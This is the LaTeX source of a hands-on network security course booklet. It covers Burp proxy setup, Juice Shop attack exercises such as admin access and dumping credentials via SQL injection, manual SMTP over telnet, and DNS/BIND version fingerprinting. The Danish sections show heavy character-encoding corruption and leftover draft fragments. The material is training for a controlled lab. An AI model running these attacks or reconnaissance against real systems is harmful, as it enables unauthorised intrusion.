It is recommended to buy the \emph{Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop} from \link{https://leanpub.com/juice-shop} - suggested price USD 5.99



\chapter{Setup JuiceShop environment, app and proxy - up to 60min}
\label{ex:js-burp}

{\bf Objective:}\\
Run JuiceShop with Burp proxy.

Start JuiceShop and make sure it works, visit using browser.

Then add a web proxy in-between. We will use Burp suite which is a commercial product, in the community edition.

{\bf Purpose:}\\
We will learn more about web applications as they are a huge part of the applications used in enterprises and on the internet. Most mobile apps are also web applications in disguise.

By inserting a web proxy we can inspect the data being sent between browsers and the application.

{\bf Suggested method:}\\
You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version \emph{plain JAR file} from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}

follow the Getting Started instructions at:\\
\link{https://support.portswigger.net/customer/portal/articles/1816883-getting-started-with-burp-suite}


{\bf Hints:}\\
Recommend running Burp on the default address and port 127.0.0.1 port 8080.

Note: Burp by default has \verb+intercept is on+ in the Proxy tab, press the button to allow data to flow.

\hlkimage{10cm}{burp-default-proxy-intercept.png}

Then setting it as proxy in Firefox:

\hlkimage{10cm}{firefox-connection-burp.png}

{\bf Solution:}\\
When web sites and servers start popping up in the Target tab, showing the requests and responses - you are done.

Your browser will alert you when visiting TLS enabled sites, HTTPS certificates do not match, as Burp is doing a person-in-the-middle. You need to select advanced and allow this to continue.

{\bf Discussion:}\\
Since Burp is often updated I use a small script for starting Burp which I save in \verb+~/bin/burp+ - dont forget to add to PATH and \verb+chmod +x bin/burp+.

\begin{alltt}
#! /bin/sh
DIRNAME=`dirname $0`
BURP=`ls -1tra $DIRNAME/burp*.jar | tail -1`
java -jar -Xmx6g $BURP &
\end{alltt}




\chapter{JuiceShop Attacks 60min}
\label{ex:juiceshop-attack}

\hlkimage{2cm}{JuiceShop_Logo_100px.png}

 {\bf Objective:}\\
Hack a web application!

Try a few attacks in the JuiceShop with web proxy

\begin{quote}
The OWASP Juice Shop is a pure web application implemented in JavaScript. In the
frontend the popular AngularJS framework is used to create a so-called Single Page
Application. The user interface layout is provided by Twitter's Bootstrap framework - which
works nicely in combination with AngularJS.
JavaScript is also used in the backend as the exclusive programming language: An Express
application hosted in a Node.js server delivers the client-side code to the browser. It also
provides the necessary backend functionality to the client via a RESTful API.

...

The vulnerabilities found in the OWASP Juice Shop are categorized into several different
classes. Most of them cover different risk or vulnerabiliy types from well-known lists or
documents, such as OWASP Top 10 or MITRE's Common Weakness Enumeration. The
following table presents a mapping of the Juice Shop's categories to OWASP and CWE
(without claiming to be complete).
\end{quote}

\hlkimage{10cm}{juiceshop-mappings.png}
Source: \emph{Pwning OWASP Juice Shop}


 {\bf Purpose:}\\
 Try out some of the described web application flaws in a controlled environment. See how an attacker would be able to gather information and attack through HTTP, browser and proxies.

 {\bf Suggested method:}\\
Start the web application, start Burp or another proxy - start your browser.

Access the web application through your browser and get a feel for how it works. First step is to register your user, before you can shop.

Dont forget to use web developer tools like the JavaScript console!

Then afterwards find and try to exploit vulnerabilities, using the book from Bj√∂rn and starting with some easy ones:

Suggested list of starting vulns:
\begin{list2}
\item Admin Section Access the Admin Section
\item Error handling Provoke and error
\item Forged Feedback Post some feedback in another users name.
\item Access a confidential document
\item Forgotten Sales Backup Access a salesman's forgotten backup file.
\item Retrieve a list of all user credentials via SQL Injection
\end{list2}


 {\bf Hints:}\\
 The complete guide \emph{Pwning OWASP Juice Shop}
written by Bj√∂rn Kimminich is available as PDF which you can buy, or you can read it online at:\\
\url{https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/}

 {\bf Solution:}\\
 You decide for how long you want to play with JuiceShop.

 Do know that some attackers on the internet spend all their time researching, exploiting and abusing web applications.

 {\bf Discussion:}\\
The vulnerabilities contained in systems like JuiceShop mimic real ones, and do a very good job. You might not think this is possible in real applications, but there is evidence to the contrary.

Using an app like JS instead of real applications with flaws allow you to spend less on installing apps, and more on exploiting.


\end{document}





\chapter{Test an e-mail server 10min}
\label{ex:email-server-test}

{\bf Objective:}\\
Try communicating with SMTP commands.

{\bf Purpose:}\\
Learn how basic the protocol is.

{\bf Suggested method:}\\
Use Kali and the telnet command line tool, if not available try nc - netcat.

\begin{alltt}
[hlk]$ {\bfseries telnet mail.zencurity.com 25}
Connected.
Escape character is '^]'.
220 server ESMTP Postfix
{\bfseries helo test}
250 server
{\bfseries mail from: postmaster@pentest.dk}
250 Ok
{\bfseries rcpt to: root@pentest.dk}
250 Ok
{\bfseries data}
354 End data with <CR><LF>.<CR><LF>
{\bfseries skriv en kort besked}
.
250 Ok: queued as 91AA34D18
{\bfseries quit}
\end{alltt}

{\bf Hints:}\\
My servr should actually not allow you to send the email, lets hope it doesn't

{\bf Solution:}\\
When you have tried sending a few emails you are done.

{\bf Discussion:}\\
How do we enforce new versions of protocol - as old as SMTP?!





\end{document}

\appendix
\rhead{\fancyplain{}{\bf \leftmark}}
%\setlength{\parskip}{5pt}

\normal

\chapter{\color{titlecolor}Host information}

\begin{itemize}
\item You should note the IP-addresses used for servers and devices
\item The web server for installing programs:\\
http:// \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm
/public/windows/
\item Server used for team login: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm \\
Available usernames: team1, team2, ... team10
password: \verb+team+
\item You can obtain root access using: \verb+sudo -s+
\end{itemize}

\section*{\color{titlecolor}Available servers and devices:}
\begin{itemize}
\item IP: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm - OpenBSD router
\item IP: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm - Your laptop
\item IP: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm - Your laptop VM
\item IP: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm -
\item IP: \hskip 15mm .\hskip 15mm .\hskip 15mm .\hskip 15mm -
\end{itemize}


\bibliographystyle{alpha}
%\bibliography{../ipv6-reference/security6-net.bib,../ipv6-reference/rfc.bib,../ipv6-reference/std.bib,../ipv6-reference/fyi.bib}
%\bibliography{kramse.bib,rfc.bib,std.bib,fyi.bib}
%,internet.bib}

%\printindex

\end{document}

\chapter{}
\label{ex:}

{\bf Objective:}\\


{\bf Purpose:}\\


{\bf Suggested method:}\\


{\bf Hints:}\\


{\bf Solution:}\\


{\bf Discussion:}\\

\chapter{Opslag i whois databaser}
\label{ex:whois}


{\bfseries Opgave:} \\
L√Ø¬ø≈ìr at bruge whois

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
\begin{list2}
\item Login p√Ø¬ø≈ì UNIX server - l√Ø¬ø≈ìs manualen til programmet whois
eller brug webinterface p√Ø¬ø≈ì\\ \link{http://www.ripe.net}
\end{list2}

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Whois databaserne er fordelt p√Ø¬ø≈ì ARIN, RIPE, LACNIC og APNIC.

Kommandoen \verb+whois -r 90.184.69.97+ vil p√Ø¬ø≈ì en OpenBSD give
svaret p√Ø¬ø≈ì et opslag i RIPE databasen efter IP adresse 90.184.69.97

{\bfseries Diskussion:}\\
I skal l√Ø¬ø≈ìre at sp√Ø¬ø≈ìrge efter IP adresser og spore oprindelsen - find
eksempelvis brugeren af IP-adressen 217.157.20.129



\chapter{ping og traceroute}
\label{ex:ping}

{\bfseries Opgave:}\\
L√Ø¬ø≈ìr at bruge ping og traceroute programmerne

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:} \\
Brug \verb+ping+ og \verb+traceroute+ til at teste netv√Ø¬ø≈ìrksforbindelsen - kan
udf√Ø¬ø≈ìres fra b√Ø¬ø≈ìde windows og UNIX.

Husk at traceroute hedder \verb+tracert+ p√Ø¬ø≈ì windows.

Er der forbindelse til alle servere p√Ø¬ø≈ì oversigtstegningen?

{\bfseries Hj√Ø¬ø≈ìlp:} \\
ICMP er Internet Control Message Protocol det bruges typisk til at
rapportere om fejl, host unreachable og lignende.

Ping programmet benytter ICMP ECHO request og forventer ICMP ECHO
reply. Traceroute programmet sender ICMP eller UDP og forventer ICMP
svar tilbage for at kunne mappe et netv√Ø¬ø≈ìrk.tomcat

{\bf Ekstra:}
Hvad er forskellen p√Ø¬ø≈ì (skal udf√Ø¬ø≈ìres p√Ø¬ø≈ì OpenBSD/UNIX)
\begin{list2}
\item {\bfseries traceroute} og {\bfseries traceroute -I}
\item NB: traceroute med -I findes kun p√Ø¬ø≈ì UNIX - traceroute med ICMP pakker
\item Der er mange der ikke blokerer for ICMP traceroute
\end{list2}

\chapter{ICMP tool - icmpush}
\label{ex:icmpush}

{\bfseries Opgave:} \\
L√Ø¬ø≈ìr at bruge icmpush programmet

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:} \\
Login p√Ø¬ø≈ì UNIX server - l√Ø¬ø≈ìs manualen til programmet

{\bfseries Hj√Ø¬ø≈ìlp:} \\
ICMP er Internet Control Message Protocol det bruges typisk til at
rapportere om fejl, host unreachable og lignende.

Ping programmet benytter ICMP ECHO request og forventer ICMP ECHO
reply. Traceroute programmet sender ICMP eller UDP og forventer ICMP
svar tilbage for at kunne mappe et netv√Ø¬ø≈ìrk.

{\bfseries Diskussion:}\\
I skal l√Ø¬ø≈ìre at sp√Ø¬ø≈ìrge efter mindst echo, time og netmask med icmpush


\chapter{DNS og navneopslag}
\label{ex:basic-dns-lookup}

{\bfseries Opgave:}\\
Pr√Ø¬ø≈ìv forskellige programmer til at sp√Ø¬ø≈ìrge en service

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
\begin{itemize}
\item nslookup - findes b√Ø¬ø≈ìde p√Ø¬ø≈ì UNIX og Windows
\item Pr√Ø¬ø≈ìv nslookup -q=txt -class=CHAOS version.bind. 0
\item dig - syntaks @server domain query-type query-class
\item host - syntaks host [-l] [-v] [-w] [-r] [-d] [-t querytype] [-a] host [server]
\item pr√Ø¬ø≈ìv {\bfseries host -a security6.net} \\
{\bfseries host -a www.security6.net} - hvad er forskellen
\end{itemize}

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Host programmet er med som standard p√Ø¬ø≈ì OpenBSD - s√Ø¬ø≈ì brug Fiona eller Luffe

P√Ø¬ø≈ì Unix Boot CD og MS Windows platformen findes mange GUI programmer til det samme.

{\bfseries Diskussion:}\\
Hvad er en zonetransfer? det er alle de records der er defineret for
et dom√Ø¬ø≈ìne

Hvad er forward og reverse lookup? forward er fra hostnavn til IP adresse,
mens reverse er fra IP adresse til hostnavn




\chapter{ping6 og traceroute6}
\label{ex:ping6}

{\bfseries Opgave:}\\
L√Ø¬ø≈ìr at bruge ping og traceroute programmerne - men med IPv6

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:} \\
Brug \verb+ping6+ og \verb+traceroute6+ til at teste netv√Ø¬ø≈ìrksforbindelsen - kan
udf√Ø¬ø≈ìres fra b√Ø¬ø≈ìde windows og UNIX.

Husk at traceroute hedder \verb+tracert6+ p√Ø¬ø≈ì windows.

Er der forbindelse til alle servere p√Ø¬ø≈ì oversigtstegningen?

{\bfseries Hj√Ø¬ø≈ìlp:} \\
ICMP er Internet Control Message Protocol det bruges typisk til at
rapportere om fejl, host unreachable og lignende. IPv6 har tilsvarende ICMPv6 med samme funktioner - men har overtaget ARP funktionen.

Ping programmet benytter ICMP ECHO request og forventer ICMP ECHO
reply. Traceroute programmet sender ICMP eller UDP og forventer ICMP
svar tilbage for at kunne mappe et netv√Ø¬ø≈ìrk.

{\bf Ekstra:}
Hvad er forskellen p√Ø¬ø≈ì (skal udf√Ø¬ø≈ìres p√Ø¬ø≈ì OpenBSD/UNIX)
\begin{list2}
\item {\bfseries traceroute} og {\bfseries traceroute -I}
\item NB: traceroute med -I findes kun p√Ø¬ø≈ì UNIX - traceroute med ICMP pakker
\item Der er mange der ikke blokerer for ICMP traceroute
\end{list2}

Det er ikke altid at IPv4 og IPv6 routes g√Ø¬ø≈ìr gennem de samme routere! Det er med vilje lavet simpelt i vores setup.

\chapter{DNS og navneopslag - IPv6}
\label{ex:basic-dns-lookup6}

{\bfseries Opgave:}\\
Pr√Ø¬ø≈ìv host programmet til at sp√Ø¬ø≈ìrge efter Quad-A (AAAA) records.

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
\begin{itemize}
\item host - syntaks host [-l] [-v] [-w] [-r] [-d] [-t querytype] [-a] host [server]
\item pr√Ø¬ø≈ìv {\bfseries host -t A security6.net} \\
{\bfseries host -t AAAA security6.net} - hvad er forskellen
\end{itemize}

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Host programmet er med som standard p√Ø¬ø≈ì OpenBSD - s√Ø¬ø≈ì brug Fiona eller Luffe

P√Ø¬ø≈ì Unix Boot CD og MS Windows platformen findes mange GUI programmer til det samme.

{\bfseries Diskussion:}\\
DNS har mange recordtyper og AAAA er blot endnu en. Typisk vil programmer der har IPv6 funktionalitet fors√Ø¬ø≈ìge at sl√Ø¬ø≈ì b√Ø¬ø≈ìde AAAA records og A records op - og fors√Ø¬ø≈ìge at forbinde til AAAA f√Ø¬ø≈ìrst.



\chapter{Performance tool - iperf}
\label{ex:iperf}

{\bfseries Opgave:} \\
L√Ø¬ø≈ìr at bruge iperf programmet

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:} \\
Login p√Ø¬ø≈ì UNIX server - l√Ø¬ø≈ìs manualen til programmet

{\bfseries Hj√Ø¬ø≈ìlp:} \\
Iperf er et lille nemt program som blot skal startes som server p√Ø¬ø≈ì en maskine og derefter kaldes som klient p√Ø¬ø≈ì et andet. S√Ø¬ø≈ì m√Ø¬ø≈ìler den som default et kort stykke tid og pr√Ø¬ø≈ìsenterer resultatet.

{\bfseries Diskussion:}\\
Til rigtige performancem√Ø¬ø≈ìlinger er det uhensigtsm√Ø¬ø≈ìssigt at netv√Ø¬ø≈ìrket benyttes til anden traffik under m√Ø¬ø≈ìlingerne, medmindre man √Ø¬ø≈ìnsker at m√Ø¬ø≈ìle nu og her.


\chapter{TCP/IP og sniffere}
\label{ex:wireshark}

\hlkimage{9cm}{images/ethereal-main-window.pdf}

{\bfseries Opgave:}\\
Pr√Ø¬ø≈ìv en Wireshark sniffer p√Ø¬ø≈ì din maskine!

Brug lidt tid p√Ø¬ø≈ì at l√Ø¬ø≈ìre den at kende.

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
Find Wireshark og installer denne, hent fra den lokale webserver eller \link{http://www.wireshark.org}

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Find ud af hvordan det er underst√Ø¬ø≈ìttet i dit favorit operativsystem
ved at bruge eksempelvis \link{http://www.google.com}

{\bfseries Forslag til l√Ø¬ø≈ìsning:}\\
Windows - hvis du er p√Ø¬ø≈ì Windows skal der
installeres WinPCAP - packet capture - biblioteket. Dette kan
eksempelvis hentes p√Ø¬ø≈ì den lokale webserver. I nyere versioner af
Wireshark f√Ø¬ø≈ìlger dette med i installationsfilen.

%adressen:
%\href{http://www.security6.net/courses/programs/WinPcap_3_0_beta.exe}
%{http://www.security6.net/courses/programs/WinPcap\_3\_0\_beta.exe}

UNIX - de fleste UNIX varianter har installationspakker til Wireshark
og TCPdump

Pr√Ø¬ø≈ìv efter installationen at kigge p√Ø¬ø≈ì den normale trafik p√Ø¬ø≈ì nettet,
eller generer selv trafik med ping og traceroute (windows: tracert)
programmer
- n√Ø¬ø≈ìr dette er gjort virker snifferen

{\bfseries Diskussion:}\\
Kender du forskel p√Ø¬ø≈ì ICMP, TCP og UDP? Pr√Ø¬ø≈ìv at skrive
\verb+icmpush -h+ mens du er logget ind p√Ø¬ø≈ì kursusserveren -
senere. Hvad er det for et program?

Hvilke protokoller bruger kryptering?

Husk ogs√Ø¬ø≈ì at sniffe en TCP session og sammens√Ø¬ø≈ìt alle pakkerne med
TCP Follow Stream funktionaliteten.

Wireshark er en efterf√Ø¬ø≈ìlger til Ethereal, navneskiftet skyldes et jobskifte hvor ejeren af Ethereal dom√Ø¬ø≈ìnet ikke ville give det med programm√Ø¬ø≈ìren.









\chapter{BIND version}
\label{ex:bind-version}

{\bfseries Opgave:} \\
Find version p√Ø¬ø≈ì BIND software p√Ø¬ø≈ì UNIX

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
Brug en af f√Ø¬ø≈ìlgende kommandoer til at finde version p√Ø¬ø≈ì BIND p√Ø¬ø≈ì
navneserveren:\\

\verb+nslookup -q=txt -class=CHAOS version.bind. 0 server+

\verb+dig @server version.bind chaos txt+


{\bfseries Hj√Ø¬ø≈ìlp:} \\

{\bfseries Diskussion:} \\
BIND softwaren er ofte udsat for angreb

BIND og navnesystemet er kritisk for mange funktioner som web og mail

\chapter{Tilpasning af DNS server}
\label{ex:bind-config}
{\bfseries Opgave:}\\
Konfiguration af en BIND ved hj√Ø¬ø≈ìlp af named.conf, men hvordan ser den ud.

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\

Log ind p√Ø¬ø≈ì Luffe, som afvikler en rekursiv DNS og Mai som afvikler en autoritativ navneserver.

Begge benytter OpenBSD hvor BIND er installeret med konfiguration og data under \verb+/var/named+.

\begin{list1}
\item Find ud af - hvad er:
\begin{list2}
\item master server
\item slave server
\item caching-only server
\end{list2}
\item \verb+/var/named+ kataloget, hint chroot'et installation
\item \verb+/var/named/etc+ - underkataloget, hint konfiguration
\item \verb+/var/named/standard+ - underkataloget, hint localhost
\end{list1}

{\bfseries Hj√Ø¬ø≈ìlp:}\\
BIND er installeret - s√Ø¬ø≈ì find \verb+named.conf+ og l√Ø¬ø≈ìs den

{\bfseries Diskussion:}\\tomcat
Det er altid en god ide at en navneserver kan svare p√Ø¬ø≈ì localhost.


\chapter{Vedligehold af DNS systemer}
\label{ex:bind-dnszone}
\hlkimage{8cm}{images/dnszone-logo.png}
{\bfseries Opgave:}\\
Pr√Ø¬ø≈ìv et gratis adminsystem til DNS

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
G√Ø¬ø≈ì ind p√Ø¬ø≈ì \link{http://www.dnszone.org} og pr√Ø¬ø≈ìv demo sitet, eller
se gratisdns interface som instrukt√Ø¬ø≈ìren kan vise.

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Det anbefales KRAFTIGT at man bruger et system til vedligehold af
DNS oplysninger

{\bfseries Diskussion:}\\
Der findes mange programmer og produkter til administration af DNS -
eksemplet ovenfor er kun et af disse.

N√Ø¬ø≈ìr man har konfigureret DNS b√Ø¬ø≈ìr man overveje at finde en service p√Ø¬ø≈ì
nettet der checker konfigurationen, eksempelvis DNS advisor fra
\link{http://www.infoblox.com} eller \link{http://www.dnsreport.com}.

Husk efter konfiguration af et dom√Ø¬ø≈ìne at checke det med programmer som dem p√Ø¬ø≈ì
\link{http://www.infoblox.com} eller \link{www.dnsreport.com}


\chapter{Konfiguration af DHCP server}
\label{ex:dhcpd-config}

{\bfseries Opgave:}\\
Konfiguration af en DHCPD foreg√Ø¬ø≈ìr ved hj√Ø¬ø≈ìlp af dhcpd.conf

{\bfseries Forslag til fremgangsm√Ø¬ø≈ìde:}\\
Unders√Ø¬ø≈ìg dhcpd.conf p√Ø¬ø≈ì vores systemer.

{\bfseries Hj√Ø¬ø≈ìlp:}\\
Log ind p√Ø¬ø≈ì systemerne og vis netv√Ø¬ø≈ìrkskonfigurationen med \verb+ifconfig+
og dhcpd.conf filen med \verb+cat /etc/dhcpd.conf+ - Luffe er den nemmeste at v√Ø¬ø≈ìlge.

N√Ø¬ø≈ìr dhcpd startes p√Ø¬ø≈ì OpenBSD benyttes tillige \verb+/etc/dhcpd.interfaces+ til at v√Ø¬ø≈ìlge
hvilke netkort der skal svares p√Ø¬ø≈ì DHCP.

\begin{alltt}
#
# DHCP server options.
# See dhcpd.conf(5) and dhcpd(8) for more information.
#
#
shared-network LOCAL-NET {
        option  domain-name "kramse.dk";
        #option  domain-name-servers 192.168.1.3, 192.168.1.5;
        subnet 10.0.45.0 netmask 255.255.255.0 {
                option routers 10.0.45.2;
                range 10.0.45.32 10.0.45.200;
        }
}
\end{alltt}

{\bfseries Diskussion:}\\
Det ville v√Ø¬ø≈ìre n√Ø¬ø≈ìsten umuligt for almindelige brugere at benytte en laptop, hvis de manuelt skulle skifte adresse fra netv√Ø¬ø≈ìrk til netv√Ø¬ø≈ìrk.

Det er ofte set at folk der manuelt s√Ø¬ø≈ìtter en adresse ender med at s√Ø¬ø≈ìtte router adressen p√Ø¬ø≈ì deres netkort, hvad sker der s√Ø¬ø≈ì?
